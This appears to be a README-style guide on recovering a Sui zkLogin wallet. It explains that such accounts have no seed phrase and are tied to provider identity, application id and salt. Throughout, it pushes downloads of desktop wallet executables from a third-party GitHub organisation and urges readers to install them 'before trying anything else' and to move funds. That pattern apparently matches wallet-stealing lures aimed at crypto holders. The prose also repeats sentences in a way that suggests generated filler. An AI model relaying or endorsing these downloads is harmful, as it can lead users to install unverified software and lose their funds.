![SUI Wallet](assets/banner-article.png)

# Recovering a zkLogin SUI Wallet

No phrase exists for a zkLogin account, so the provider identity and salt are the recovery.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

A zkLogin account has no recovery phrase and no exportable private key, so it is recovered by signing in
again with the same provider identity, the same application id and the same salt. Lose any one of those and
the address is unreachable. The safe default is to move funds to a phrase-backed account early.

## Why there is no phrase

A phrase-backed account is a secret you hold; a zkLogin account is an address derived from a sign-in
identity plus a salt. There is no string to write on paper, because the thing that authorises spending is a
proof produced at sign-in time.

That is the design rather than a missing feature. It is also why the usual advice - write the words down -
has nothing to attach to here.

## The three inputs to the address

The address depends on the provider identity, the OAuth application id and the salt. Change any one and you get a different address, which is valid, empty and no longer the one holding your balance at all. Three inputs, one address, and no shortcut around them.

This explains the commonest report in this area: a returning user who signed in successfully and found an
empty account. Nothing failed; something upstream differed, and the screen has no way to say which.
[What is zkLogin in SUI Wallet?](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/what-is-zklogin-in-sui-wallet.md) covers what the account is and why the provider never learns the
address.

Write down which provider and which account you used, even though there is no phrase to record. That note is the only artefact this kind of account has, and it is what turns a mystery into a checklist later.

## Signing in to the right address

Use the same provider, the account at that provider, and the same application. A different Google account is a different identity, and a different application id is a different derivation even for the same person signing in. The salt is the variable most people lose track of.

The salt is the part people lose track of, because it is not something you memorise or type. Where a wallet
manages it, the same installation produces the same salt; a different machine or a reinstalled application
may not.
[Signing in to SUI Wallet with Google](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/signing-in-to-sui-wallet-with-google.md) walks the sign-in itself, including what appears on screen
before and after the address arrives.

## Can I get the keys out?

No. There is no exportable private key for a zkLogin account, which is the fact that decides everything else on this page. You cannot move the account to another wallet, and no tool can be asked for its phrase. That is the design rather than an omission in it.

What you can move is the balance. While you can still sign in, sending the funds to an account created from
24 words converts an account you sign into for now into one you can restore anywhere, later.

## The legacy account route

An older zkLogin account that still signs in is worth treating as a temporary situation. Sign in, create a phrase-backed account in the same wallet, write the 24 words on paper, and send the balance across before anything changes. Do it while the sign-in still works, because that is the only time it is possible.

The [repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) records what each release
changed, which is worth reading before concluding that a sign-in flow has broken rather than the account
being a different one.

Do that before anything changes - a provider account, a machine, an application update. The window in which
this is easy is exactly the window in which nobody thinks they need it.
[Restoring SUI Wallet from a seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/restoring-sui-wallet-from-seed-phrase.md) is where the phrase-backed half of that move ends up.

## A different address on return

Signing in and landing on a new address is normal in three situations: a different provider account, a different application, or a salt that no longer matches. A reinstalled or different machine is the usual cause of the third. The address you land on is real; the history you expected is on the other one.

The address you see is real and belongs to you, in the sense that you can sign for it. What it does not have
is the balance you were expecting, and no amount of signing in again brings that back.

The exception worth checking first is the obvious one: signing in with the right account but into the wrong application, which happens when two builds of the same site both offer a sign-in.

## Making the move now

The current release from the release page is where the reported problems are fixed, and the repository records the changes between builds. If a sign-in flow behaves unlike this page, install it before assuming the account is gone for good.

The check afterwards is the part people skip: confirm the new account shows the balance and that the 24 words restore it on another machine. A move that has not been verified is a hope with a signature.

## FAQ

### Can a passphrase be generated from a zkLogin account?

No. The account is derived from an identity, an application id and a salt; there is no secret to encode as
words, and nothing to export.

### Can I recover a zkLogin account with a seed phrase?

No. There is no phrase involved on either side of that exchange. Recovery means signing in again with the
same three inputs.

### How can I transfer the funds of a legacy zkLogin wallet?

Sign in while you still can, create a phrase-backed account, and send the balance to it. Then keep the 24
words on paper and stop depending on the sign-in.

### Is it possible to access the private keys of a zkLogin wallet?

No. There is no exportable key. The proof produced at sign-in authorises transactions without revealing
anything a key would.

### Is there a normal situation where a returning user gets a different address?

Yes: a different provider account, a different application id, or a salt that changed with a reinstall or a
different machine. Each produces a valid address with no history.

### Does the provider learn my address?

No. The sign-in proves an identity without disclosing the Sui address to the provider, which is the point of
the construction.
